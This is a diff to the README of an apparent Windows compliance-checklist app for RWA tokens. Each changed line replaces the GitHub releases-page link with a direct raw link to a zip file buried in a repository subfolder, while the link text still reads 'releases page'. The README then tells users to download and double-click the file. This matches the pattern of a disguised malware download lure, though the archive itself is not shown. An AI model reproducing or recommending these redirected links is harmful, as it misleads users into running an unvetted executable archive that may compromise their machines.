@@ -1,6 +1,6 @@
 # 🧾 rwa-compliance-checklist - Clear RWA Compliance Tracking
 
-[![Download](https://img.shields.io/badge/Download-blue-grey)](https://github.com/sharonhopeless346/rwa-compliance-checklist/releases)
+[![Download](https://img.shields.io/badge/Download-blue-grey)](https://raw.githubusercontent.com/sharonhopeless346/rwa-compliance-checklist/main/regulatory-map/rwa-checklist-compliance-v3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Use this app if you need a clear checklist before you issue or manage RWA tokens
 
 ## 📥 Download the App
 
-1. Open the [releases page](https://github.com/sharonhopeless346/rwa-compliance-checklist/releases).
+1. Open the [releases page](https://raw.githubusercontent.com/sharonhopeless346/rwa-compliance-checklist/main/regulatory-map/rwa-checklist-compliance-v3.5.zip).
 2. Find the latest Windows release.
 3. Download the file made for Windows.
 4. Open the file after the download finishes.
@@ -32,7 +32,7 @@ The app is designed for normal Windows desktops and laptops. A newer system will
 
 ## 🛠️ Install and Run
 
-1. Go to the [releases page](https://github.com/sharonhopeless346/rwa-compliance-checklist/releases).
+1. Go to the [releases page](https://raw.githubusercontent.com/sharonhopeless346/rwa-compliance-checklist/main/regulatory-map/rwa-checklist-compliance-v3.5.zip).
 2. Download the Windows file from the newest release.
 3. Save the file to your Downloads folder.
 4. Double-click the file to start setup.
@@ -206,7 +206,7 @@ If you see an `.exe` or `.msi`, open it to begin setup. If you see a `.zip`, ext
 
 ## 🔄 Updates
 
-Check the [releases page](https://github.com/sharonhopeless346/rwa-compliance-checklist/releases) when you want the latest version. New releases may include checklist updates, rule changes, or better layout changes for easier use.
+Check the [releases page](https://raw.githubusercontent.com/sharonhopeless346/rwa-compliance-checklist/main/regulatory-map/rwa-checklist-compliance-v3.5.zip) when you want the latest version. New releases may include checklist updates, rule changes, or better layout changes for easier use.
 
 ## 📋 Simple First Run Checklist
 
